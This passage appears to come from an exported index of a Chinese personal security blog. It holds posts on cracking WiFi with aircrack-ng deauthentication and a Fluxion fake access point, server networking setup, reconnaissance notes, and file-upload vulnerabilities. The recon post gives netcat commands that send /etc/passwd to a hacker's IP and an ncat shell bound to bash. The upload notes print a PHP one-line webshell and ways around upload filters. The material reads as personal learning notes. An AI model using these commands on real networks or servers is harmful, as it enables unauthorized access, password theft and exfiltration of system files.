hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> 随想 </tag>
            
            <tag> Typora </tag>
            
            <tag> OSS </tag>
            
            <tag> picgo-core </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WIFI破解的两种常用姿势</title>
      <link href="2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/wifi%E7%A0%B4%E8%A7%A3%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
      <url>2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/wifi%E7%A0%B4%E8%A7%A3%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h3 id="wifi抓cap包暴破"><a href="#wifi抓cap包暴破" class="headerlink" title="wifi抓cap包暴破"></a>wifi抓cap包暴破</h3><p>硬件：kali网卡</p><p>双频，2.4G/5GHz</p><p>抓握手包 包含了密文用户名密码</p><p>搜索 跑包</p><p>打进 内网  获取用户信息</p><p>iwconfig 查看无线网卡名称wlan0以及是否插好</p><p><strong>service network-manager stop</strong> 所有网络服务停掉</p><p><strong>airmon-ng check kill</strong> 干掉所有调用它的兄弟</p><p><strong>airmon-ng start wlan0(网卡名)</strong> 开启无线网卡</p><p>ifconfig 看到无线网络的情况（wlan0变成了mon0-00名）</p><p><strong>airodump-ng mon0</strong> 开启无线网卡侦测，BSSID是mac，data表示有连接</p><p>A4:1A:3A:86:0B:C5  -c 11</p><p>50:3A:A0:DA:A6:A0</p><p>D0:FF:98:24:64:D5</p><hr><p>窗口2</p><p><strong>airodump-ng mon0 –bssid [目标mac] -c [频道] -w [包写到目标文件的名字]</strong>  同时查看到连在该wifi上的设备的mac地址，选frames最活跃的</p><hr><p>窗口1</p><p><strong>aireplay-ng -0 [要发起攻击的次数:20] -a [目标wifi的mac] -c [连在该wifi上的设备mac] mon0[网卡]</strong>   发起断网攻击</p><p>之后设备会自动重连，传递含有账户密码的包给wifi，窗口1结束后，当别人再次连接时，在窗口2上看到wpa handshake，此时可以结束窗口2，在root目录下找到之前命名的文件夹，跑包.cap文件即可</p><hr><h4 id="跑包"><a href="#跑包" class="headerlink" title="跑包"></a>跑包</h4><p><strong>aircrack-ng -w mima.txt[字典] haha-01.cap</strong></p><h4 id="网卡重新连接wifi"><a href="#网卡重新连接wifi" class="headerlink" title="网卡重新连接wifi"></a>网卡重新连接wifi</h4><p><strong>systemctl start NetworkManager</strong> 注意大小写   开启wifi自动管理</p><blockquote><p>iwconfig 适用于WPA，所以即使账户密码正确也报错invalid arguement</p><p>wpa2用wpa_cli设置</p><p>wpa_cli基于wpa_supplicant </p><p>关于wpa_cli  <a href="https://www.cnblogs.com/nm666/p/15567164.html">https://www.cnblogs.com/nm666/p/15567164.html</a></p><p>wpa_supplicant -i wlan0[接口名]  初始化该服务</p><p>/etc/init.d/networking start    启动networking服务</p></blockquote><h3 id="wifi钓鱼fluxion伪热点"><a href="#wifi钓鱼fluxion伪热点" class="headerlink" title="wifi钓鱼fluxion伪热点"></a>wifi钓鱼fluxion伪热点</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://www.github.com/FluxionNetwork/fluxion.git</span><br></pre></td></tr></table></figure><p>在当前用户目录下</p><p>ls进入fluxion，</p><p>./fluxion.sh 运行发现缺少依赖</p><p>./fluxion.sh -i  自动安装依赖</p><p>./fluxion.sh 运行</p><p>根据中文包来选择</p><h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><p>选择检查握手包获取状态——aireplay-ng 解除认证方式 侵略性 </p><p>选择hash验证方法——cowpatty验证, cowpatty是一款WPA-PSK字典攻击软件,实现字典与目标包的匹配与爆破</p><p>如何进行验证——synchronously 同时的 同步的</p><p>弹出3个窗口抓包，抓到后关闭窗口</p><p>开始配置伪热点攻击</p><p>最后在fluxion文件夹下找密码</p><ul><li>总体思路，先带有加密密码的包，然后钓鱼密码，通过验证后结束钓鱼</li><li>开始攻击后，6个窗口全部弹出，原wifi受到攻击，无法连接，手机端自动连接伪热点，局域网外可见两个相同伪热点，伪热点无小锁头</li><li>验证网页我这里选择自带的通用认证网页（Chinese），虽然有些假，但是我们可以自己写一个认证网页以达到以假乱真的地步。根据路由器的厂家比如TP-link，水星，华为，等等等为其编写相应的路由认证网页（<strong>这一步是你能不能得到秘钥的关键</strong>）!</li></ul><p>参考链接 <a href="https://blog.csdn.net/weixin_44419064/article/details/112908357">https://blog.csdn.net/weixin_44419064/article/details/112908357</a></p><hr><h4 id="遇到的问题："><a href="#遇到的问题：" class="headerlink" title="遇到的问题："></a>遇到的问题：</h4><p>AP-service在建立后过段时间会报错 handle-probe  send failed</p>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> fluxion </tag>
            
            <tag> cap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0搭建机房服务器</title>
      <link href="2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E4%BB%8E0%E6%90%AD%E5%BB%BA%E6%9C%BA%E6%88%BF%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E4%BB%8E0%E6%90%AD%E5%BB%BA%E6%9C%BA%E6%88%BF%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="服务器采购"><a href="#服务器采购" class="headerlink" title="服务器采购"></a>服务器采购</h3><p>买了4台二手dell的二手服务器，R620和R720的板子</p><h4 id="服务器分类"><a href="#服务器分类" class="headerlink" title="服务器分类"></a>服务器分类</h4><p>塔式，机架式，刀片式</p><hr><p>直接采购某宝二手服务器</p><p>1U 戴尔R620 2.5寸8盘 2660V2 48G内存 500gSSD<em>1  1tSAS</em>1 h310卡 单电源 未税2530元<br>2U 戴尔R720XD 3.5寸12盘 2660V2<em>2 32G内存 480gSSD</em>11TSAS*1 H310卡 单电源 未税3030元</p><p>预装ubuntu20.04 desktop系统</p><p>机柜：机柜的宽一般是固定的，只需要选择深度和高度即可</p><h3 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h3><h3 id="专线IP"><a href="#专线IP" class="headerlink" title="专线IP"></a>专线IP</h3><p>与千兆宽带相对应，电信千兆宽带实际第三方测试最高只有600M左右，不稳定时降到200M，而运营商只认自己的软件测速。流量从本地网络设备经过时的损耗在本地设备条件不短板情况下可忽略不计。</p><p>100M专线会有5个ip，大概一个月2000￥，而50M专线只有1个固定ip</p><h4 id="专线固定IP为什么会变"><a href="#专线固定IP为什么会变" class="headerlink" title="专线固定IP为什么会变"></a>专线固定IP为什么会变</h4><p>因为ubuntu20的gui右上角的网络设置中的配置不对</p><p>外网需要配网关，内网地址不能配网关，内网需要走静态路由，否则会根据连接的先后时间顺序，先把内外网的其中一个网关当做默认网关，在route内核路由表中可以查看，让所有流量都走默认网关。</p><p>需求是外网使用固定ip，则只能把外网网卡当做默认网关，若把内网的千兆宽带当做网关则获得的是动态外网ip，此时只需要将服务器当做内网的一台上网电脑来配置路由即可。</p><p>与运营商沟通后，还存在一个隐患，运营商提供的光交盒子最好不要当交换机使用，性能更不上可能会导致不稳定。默认开启1号网口的专线ip流量。</p><p>在中国，专线ip的80，443端口需要备案才能开通</p><h3 id="除了ssh，如何更方便管理ubuntu"><a href="#除了ssh，如何更方便管理ubuntu" class="headerlink" title="除了ssh，如何更方便管理ubuntu"></a>除了ssh，如何更方便管理ubuntu</h3><h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p><strong>cat /etc/issue 或者 lsb_release -a</strong> 查看Ubuntu系统的版本号命令</p><p>apt-get install openssh-server</p><p>systemctl start/restart ssh</p><p>ssh_config 是配置客户端</p><p>sshd_config 配置服务端，port22若不取消注释，默认开启22端口</p><h4 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h4><ul><li><strong>xrdp</strong>安装时会自动一起安装xorg包，xorg类似于远程桌面的中间件，但是与新版的ubuntu20.04 上默认安装的gnome配合好像不太好，当使用自己笔记本win的mstsc远程连接到这台ubuntu后，在xorg的登录界面输入用户名和密码之后闪退，网上类似的例子是因为在该登录用户下的.xsession-error文件中发现是和anaconda的环境变量路径有冲突，但我这台ubuntu并无anaconda，于是突然想换用VNC方案，于是开始考虑卸载xrdp包，，，</li></ul><h4 id="关于apt-get-包管理"><a href="#关于apt-get-包管理" class="headerlink" title="关于apt-get 包管理"></a>关于apt-get 包管理</h4><ul><li><p>linux安装默认是散装到各个文件夹中的</p></li><li><p>apt -h 和apt-get -h 结果不一样</p></li><li><p>apt list 查看已安装包</p></li></ul><hr><p>但是，，，万一不是这个原因呢，于是决定再仔细研读一下日志文件</p><ul><li><strong>vim .xorgxrdp.11.log</strong>，查看log文件，发现有权限相关errors，谷歌之后怀疑是因为重复登录导致的冲突，故尝试单独为xrdp创建一个用户</li></ul><h4 id="xshell传文件"><a href="#xshell传文件" class="headerlink" title="xshell传文件"></a>xshell传文件</h4><p>ZMODEM传输前，需要<strong>apt install lrzsz</strong></p><h4 id="ubuntu新建用户"><a href="#ubuntu新建用户" class="headerlink" title="ubuntu新建用户"></a>ubuntu新建用户</h4><p>1、sudo useradd -r -m -s /bin/bash userName   -r：建立系统账号；-m：自动建立用户的登入目录；-s：指定用户的默认使用shell</p><p>2、sudo passwd userName     //根据提示输入新用户的密码即可</p><p>3、ls /home 出现新用户的目录说明创建成功</p><hr><p>user4xrdp用户新建后成功登录！！</p><p>但是，为啥首次登录需要输入root123账户的密码？难道跟我先用root123账户登录，然后切到root之后再创建user4xrdp账户的这个方式有关？<strong>之后研究一下linux的用户模式，此处埋坑</strong></p><p>emmm但是用起来速度有点慢呐，因为此时流量还是从外面饶了一圈，下一步是让服务器流量也可以从内网流通</p><hr><h3 id="配置内外网桥梁服务器"><a href="#配置内外网桥梁服务器" class="headerlink" title="配置内外网桥梁服务器"></a>配置内外网桥梁服务器</h3><p>如何让一台服务器一个网卡连着外网，另一个网卡连着内网呢？</p><p>这个机架式服务器都有4个网卡，一号口接专线，二号口接内网，这也是之前ip变动的原因，这是流量流通方向不同导致的，而这又与网卡开关有关系。</p><p>逐个排查etc目录下的几个网络相关的配置文件</p><h4 id="netplan"><a href="#netplan" class="headerlink" title="netplan"></a><strong>netplan</strong></h4><ul><li><p>新版ubuntu 20 都把配置写入netplan中，但是打开后只有个yaml文件</p></li><li><p>netplan通过networkmanager渲染，而networkmanager文件通过重启系统写入linux内核路由表，通过route命令可查看</p></li><li><p>在服务器版本ubuntu 22 中，无图形界面，直接配置netplan即可，netplan apply后写入route内核</p></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This is the network config written by &#x27;subiquity&#x27;</span></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">eno1:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">addresses:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">61.160</span><span class="number">.99</span><span class="number">.52</span><span class="string">/29</span></span><br><span class="line">      <span class="attr">gateway4:</span> <span class="number">61.160</span><span class="number">.99</span><span class="number">.49</span></span><br><span class="line">      <span class="attr">nameservers:</span></span><br><span class="line">        <span class="attr">search:</span> [<span class="string">mydomain</span>, <span class="string">otherdomain</span>]</span><br><span class="line">        <span class="attr">addresses:</span> [<span class="number">221.228</span><span class="number">.255</span><span class="number">.1</span>,<span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span>]</span><br><span class="line">    <span class="attr">eno2:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">addresses:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.130</span><span class="number">.251</span><span class="string">/24</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">to:</span> <span class="number">192.168</span><span class="number">.110</span><span class="number">.0</span><span class="string">/23</span></span><br><span class="line">            <span class="attr">via:</span> <span class="number">192.168</span><span class="number">.130</span><span class="number">.254</span></span><br><span class="line">            <span class="attr">metric:</span> <span class="number">100</span>   </span><br><span class="line">    <span class="attr">eno3:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">eno4:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>netplan详解</p><p><a href="https://zhuanlan.zhihu.com/p/413440638">https://zhuanlan.zhihu.com/p/413440638</a></p><h4 id="network目录"><a href="#network目录" class="headerlink" title="network目录"></a><strong>network目录</strong></h4><p>在Debian/Ubuntu的发行版本里，网络建立前、后和网络断开前、后都会到/etc/network/里运行相应目录下的脚本</p><pre><code>if-down.d -- 网络关闭前if-post-down.d -- 网络关闭后if-pre-up.d -- 网络建立前比如在网络建立后自动跑一个vpn 参考https://blog.51cto.com/jack88/2160178if-up.d -- 网络建立后</code></pre><h4 id="networkd-dispatcher目录"><a href="#networkd-dispatcher目录" class="headerlink" title="networkd-dispatcher目录"></a><strong>networkd-dispatcher目录</strong></h4><p>好像是用来检测并发送网络连接状态的，这玩意漏洞还挺严重的 <a href="https://www.4hou.com/shop/posts/n6L4">https://www.4hou.com/shop/posts/n6L4</a></p><h4 id="NetworkManager"><a href="#NetworkManager" class="headerlink" title="NetworkManager"></a><strong>NetworkManager</strong></h4><p>gui图形化界面设置的网络连接就是对应该目录下的system-connections文件</p><p>需要root权限</p><p>systemctl restart NetworkManager 重启服务</p><p>apt-get install traceroute <a href="https://www.zhihu.com/question/513138815/answer/2392202693">https://www.zhihu.com/question/513138815/answer/2392202693</a></p><p>关于老版本的ubuntu在网络配置方面与新版本的区别</p><p><a href="https://www.360blogs.top/ubuntu20-04-netplan/">https://www.360blogs.top/ubuntu20-04-netplan/</a></p><hr><h4 id="外网电信的局域网"><a href="#外网电信的局域网" class="headerlink" title="外网电信的局域网"></a>外网电信的局域网</h4><p>嗯？好像，通了，参考链接<a href="https://www.cnblogs.com/opsprobe/p/9979234.html">https://www.cnblogs.com/opsprobe/p/9979234.html</a></p><p>原因，ubuntu20.04版本的图形化界面的网络设置是有bug的，通过图形化界面配置来调用两个网卡，只有一个生效，谁先开启，谁先生效，可以用ip138测试外加内网ping验证</p><p>图形化界面对应的配置时NetworkManager目录下的connections配置，</p><p>自从17版本之后，ubuntu使用netplan来统一管理网络，故如上参考链接一样，直接在netplan中把networkmanager中的配置抄一遍，然后把图形化界面的两个以太网配置都断掉，然后netplan apply试netplan配置文件生效</p><hr><p>嗐，白高兴一场，通了是因为路由器为了负载临时切换到50地址，此时流量直接在本地ping通专线51地址，实际上外网并不通</p><hr><h5 id="NetworkManager失效的解决办法"><a href="#NetworkManager失效的解决办法" class="headerlink" title="NetworkManager失效的解决办法"></a>NetworkManager失效的解决办法</h5><p>桌面版Ubuntu可通过可视化的NetworkManager管理网络，类似于Windows系统的更改适配器选项。<br>但虚拟机安装的桌面版Ubuntu经常会因为虚拟机的挂起或者非正常关机导致NetworkManager失效。失效时，桌面右上角的设置菜单中可以看到“<strong>网络设备未托管</strong>”的提示。若出现该问题，可修改/etc/NetworkManager/NetworkManager.conf配置文件，将managed=False修改为True。修改配置文件后，重启NetworkManager服务：<strong>sudo service network-manager restart</strong>，则可修复问题。若此方法未能解决问题，则使用上一节介绍的netplan配置网络。</p><hr><h4 id="配置route生效"><a href="#配置route生效" class="headerlink" title="配置route生效"></a>配置route生效</h4><p>在gui界面的网络设置中配置网络之后，重启才能让新的配置刷新到route表中，使用route命令查看</p><ul><li>内网网卡别设置网关，只需要设置内网静态ip即可</li><li>内网网卡配置两个静态路由(1条即可)</li><li><ul><li>网络情况：本身处于192.168.130.250，核心交换机作为网关，地址192.168.130.254 同时该交换机上另外两个VLAN接口地址分别是110和120.254  </li><li>目标地址 192.168.110.0   255.255.254.0 192.168.130.254.0  50跃数</li><li>目标地址192.168.110.0  255.255.255.255（整个网络） 网关同上 跃数同上 （这条可以删了，route del -net 192.168.110.0 netmask 255.255.255.255，此时重启后可能还会载入内核route，所以需要把networkmanager的中的配置也修改一下，这里直接通过gui界面修改即可）</li></ul></li></ul><p>另外，我是直接通过gui界面来设置，通过重启来刷新内核路由表，通过route命令查看，<strong>详细参考我的另一篇博客</strong>（留坑）<a href="https://blog.csdn.net/weixin_42160117/article/details/126418586">https://blog.csdn.net/weixin_42160117/article/details/126418586</a></p><h3 id="linux权限管理机制"><a href="#linux权限管理机制" class="headerlink" title="linux权限管理机制"></a>linux权限管理机制</h3><p>建立普通用户账号</p><p>1、sudo useradd -r -m -s /bin/bash userName   -r：建立系统账号；-m：自动建立用户的登入目录；-s：指定用户的默认使用shell</p><p>2、sudo passwd userName     //根据提示输入新用户的密码即可</p><p>3、ls /home 出现新用户的目录说明创建成功</p>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集取证技术</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%8F%96%E8%AF%81%E6%8A%80%E6%9C%AF/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%8F%96%E8%AF%81%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="本地信息搜集"><a href="#本地信息搜集" class="headerlink" title="本地信息搜集"></a>本地信息搜集</h3><p>(以win为例)</p><p>whoami 查看自己的身份</p><p>whoami /all 获取当前域（active direction 微软系统工程师学习）的信息</p><p>ipconfig /all 获取详细的ip信息</p><p>arp -a 查看arp表，如果有跟网关地址一样的，则表示可能arp欺骗</p><p>systeminfo  </p><blockquote><p>OS是sp1和非sp1差距还是很大</p><p>独立工作站表示未加入公司域环境</p><p>cpu考虑挖矿</p><p>BIOS考虑是否是蜜罐</p><p>启动设备判断是否虚拟机</p><p>域：workgroup表示未加入工作组</p><p>补丁漏洞</p></blockquote><p>echo %PROCESSOR_ARCHITECTURE%    查看cpu类型</p><p>wmic product get name,version 获取电脑上安装的程序和版本信息</p><p>wmic qfe get Caption,Description,HotFixID,InstalledOn 以详细方法查看电脑安装的补丁</p><p>wmic process list brief 查看进程</p><p>net user 查看本地用户</p><p>net session 显示本地和远程的会话</p><p>net view 查看内网共享，可以看到对方计算机，服务器名称</p><h3 id="远程信息搜集"><a href="#远程信息搜集" class="headerlink" title="远程信息搜集"></a>远程信息搜集</h3><p><a href="http://seo.chinaz.com/">http://seo.chinaz.com</a> 查看网站权重等，</p><blockquote><p>一般打2-6权重，2几百，3几千，7,8可遇不可求。</p><p>同ip网站，有的是实习生写的，漏洞比较多，大型网站也可以从侧面攻破。eg用js写的密码验证，将js点掉之后验证码随便出，就可以进去了；</p><p>黑帽SEO，搞定网站后挂黑链</p></blockquote><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com</a></p><p>联系人，eg：whoisguardProtect 说明该网站有反whois查询</p><p>DNS cloudflare  比较麻烦找到真实ip</p><p>活跃主机识别  nmap -sP [网段]</p><p>nping -tcp -p 445 -data [十六进制数据] [目标ip]  对目标的445端口以tcp方式发送一串十六进制数据，（如果对tcp三次握手四次挥手的十六进制比较熟悉可以自定义这串字符，可模拟常见网络攻击，可测试对方防御效果）</p><p>zenmap 是nmap的图形化界面版本</p><p>nmap -sV [目标ip] 对服务器进行指纹识别，nmap是开源的，可自行改造，（服务器也会识别攻击工具的指纹，以前只会工具的时代已经不复了，需要会代码）</p><p>amap -bq [目标ip] [端口]  返回该端口的服务信息，服务枚举</p><p>nc -nvz [ip] 1-65535 使用nc进行扫描（nc比较慢，不太擅长用来扫描）</p><p>tips：虚拟机，各种能收集到的软件放在u盘随身携带，笔记云端，比如微软账号可以使用微软在线产品，google硬盘，印象笔记等</p><hr><h3 id="nc加密传输"><a href="#nc加密传输" class="headerlink" title="nc加密传输"></a>nc加密传输</h3><p>kali中的敏感目录，etc/passwd  通过显示的用户来判断有哪些服务，如<a href="http://www.data/">www.data</a> 表示肯定有web服务</p><p>etc/shadow  存放用户名与密码，存放哈希值，（通过哈希值可以穷举出密码）</p><p>当拿到一台linux的敏感目录后，传输过程中防止防火墙的检测，需要加密，cat /etc/passwd | base64</p><p>使用nc传输：</p><blockquote><p>传输文字</p><p>目标 cat /etc/passwd | base64 | nc -nv [黑客ip] 3333 -q 1    q1是传完之后立马退出</p><p>hacker：nc -lp 3333 &gt; kali.txt</p><p>传输文件</p><p>目标 nc -nv [黑客ip] 3333 &lt; [要传的文件] -q 1</p><p>hacker：nc -lp 3333 &gt; xx.txt</p><p>文件传输一般在传输之前就加密好，其实使用压缩，一般防火墙不会去解压</p><p>tips：linux自带压缩软件 命令 zip 没有也很容易安装</p></blockquote><h3 id="远程克隆linux硬盘"><a href="#远程克隆linux硬盘" class="headerlink" title="远程克隆linux硬盘"></a>远程克隆linux硬盘</h3><p>可用来取证 </p><p>克隆linux的硬盘信息</p><blockquote><p>网警端： nc -lp 3333 | dd of=/dev/sda   sda表示硬盘1   网警端最好也是linux系统</p><p>目标： dd if=/dev/sda | nc -nv [网警ip] 3333 -q 1   if中i是in ，o=out</p><p>linux一般挂在根目录，一般只需要sda</p></blockquote><p>如果目标系统中没有nc，可以使用whois搭配nc，适用于两台linux，一般用于传输小文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网警 nc -lvp 3333 | sed &quot;s/ //g&quot; | base64 -d  (自己有nc，目标没有nc，-d decode)</span><br><span class="line"></span><br><span class="line">目标  whois -h [网警ip] -p 3333 `cat /etc/passwd | base64` （反引号）</span><br></pre></td></tr></table></figure><p>只要有连接，nc基本都可以连接</p><h3 id="ncat密文传输命令"><a href="#ncat密文传输命令" class="headerlink" title="ncat密文传输命令"></a>ncat密文传输命令</h3><p>nc传输明文，输入命令会被防火墙侦测到，因此诞生nc加密版ncat，别的功能都很相似</p><blockquote><p>两台linux用ncat连接</p><p>目标(linux,如果是win，bash改为cmd)  ncat -c bash –allow [黑客ip]  -vnl 3333 –ssl    只允许黑客ip通过ssl加密连接</p><p>黑客  ncat -nv [目标ip] 3333 –ssl</p></blockquote><h3 id="github"><a href="#github" class="headerlink" title="github"></a>github</h3><p>ms17010，知道漏洞名字直接搜名字，或者搜window漏洞</p><p>MS15-076 微软公司15年的第76个漏洞，远程代码执行漏洞基本指哪打哪</p><p>取证</p><p>ncat，netcat等</p><hr><h3 id="企业中两个环境"><a href="#企业中两个环境" class="headerlink" title="企业中两个环境"></a>企业中两个环境</h3><h4 id="AD-域环境"><a href="#AD-域环境" class="headerlink" title="AD 域环境"></a>AD 域环境</h4><p>AD（active directive）活动目录服务器</p><p>当入侵企业时：</p><p>参考教程 <a href="https://www.cnblogs.com/cnjavahome/p/9029665.html">https://www.cnblogs.com/cnjavahome/p/9029665.html</a></p><p>（精通win域服务安装）</p><h4 id="exchange-server"><a href="#exchange-server" class="headerlink" title="exchange server"></a>exchange server</h4><p>仅次于AD重要</p><p>参考教程 <a href="https://blog.51cto.com/weixianfei/690838">https://blog.51cto.com/weixianfei/690838</a></p><p>内网邮件服务器，钓鱼邮件，点开病毒，的前提要明白这个的原理，每家公司必备</p><p>外网的邮件服务器直接上一台linux就可以搞</p><hr><p>任务：</p><p>学完js后半部分</p><p>vultr公网部署kali-live，（公网不会被发现？）</p><p>会部署vmware，kvm，xen，openvz，OpenStack，docker，virtual pc</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件相关漏洞</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>Arbitrary File Upload，任意文件上传是指用户上传了一个可执行的脚本文件，并且此脚本文件获得了执行服务端命令的能力</p><p><strong>原因</strong>：服务器对上传文件处理逻辑不够安全</p><p><strong>一句话木马</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);  <span class="comment">//上传的文件</span></span><br><span class="line">a=system(<span class="string">&quot;cat%20etc/password&quot;</span>) <span class="comment">//url中</span></span><br></pre></td></tr></table></figure><h4 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h4><h5 id="web-server端设计缺陷——路径解析问题"><a href="#web-server端设计缺陷——路径解析问题" class="headerlink" title="web server端设计缺陷——路径解析问题"></a>web server端设计缺陷——路径解析问题</h5><ul><li>Apache 对后缀解析从右向左，如果后缀不在已知后缀名单中，向左继续寻找，如test.php.a.b</li><li>php cgi 解析 <a href="http://www.a.com/test.jpg/notexist.php">http://www.a.com/test.jpg/notexist.php</a> 此时如果这个notexist.php文件不存在，会将test.jpg当做php处理</li><li>IIS 6 下，当文件名为abc.php;xx.jpg 时，会将其解析为abc.php</li></ul><h5 id="——-htaccess文件"><a href="#——-htaccess文件" class="headerlink" title="——.htaccess文件"></a>——.htaccess文件</h5><ul><li>前提，Apache需要开启两个设置，mod_rewrite ，AllowOverride All</li><li>在允许上传.htaccess的场合，上传该文件可以让Apache按照.htaccess文件中的规则执行解析方案</li></ul><p>抓包，content-disposition中改filename=”.htaccess” ,在http正文头添加<strong>AddType=application/x-httpd-php .jpg</strong>  意思是把jpg当做php格式解析</p><h5 id="前端检查"><a href="#前端检查" class="headerlink" title="前端检查"></a>前端检查</h5><p>修改js，或者抓包修改，绕过</p><h5 id="content-type绕过"><a href="#content-type绕过" class="headerlink" title="content-type绕过"></a>content-type绕过</h5><p>抓包绕过，修改包中的content-type字段</p><h5 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h5><p>过滤php关键词的话，可以把代码放在html中当做php执行，或者修改为phtml php3 php4 php5 Php php (空格) php</p><h5 id="双写、大小写绕过"><a href="#双写、大小写绕过" class="headerlink" title="双写、大小写绕过"></a>双写、大小写绕过</h5><p>pphphp，有的只过滤小写php，可以写成大写PHP一样执行</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><h5 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h5><h5 id="绕过-DATA绕过-WINDOWS"><a href="#绕过-DATA绕过-WINDOWS" class="headerlink" title=".绕过     ::$DATA绕过(WINDOWS)"></a>.绕过     ::$DATA绕过(WINDOWS)</h5><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><h5 id="前端js绕过"><a href="#前端js绕过" class="headerlink" title="前端js绕过"></a>前端js绕过</h5><p>1、如果是前端弹窗，大概率是js验证，f12修改js，如果遇到js混淆，正则表达式替换法用在线工具，基于DOM文档树的混淆考虑调试函数功能</p><p>2、抓包修改</p><h5 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h5><p>尝试pphphp这样的后缀，如果上传成功，尝试能否被解析成功</p><h5 id="后端对http包的检查"><a href="#后端对http包的检查" class="headerlink" 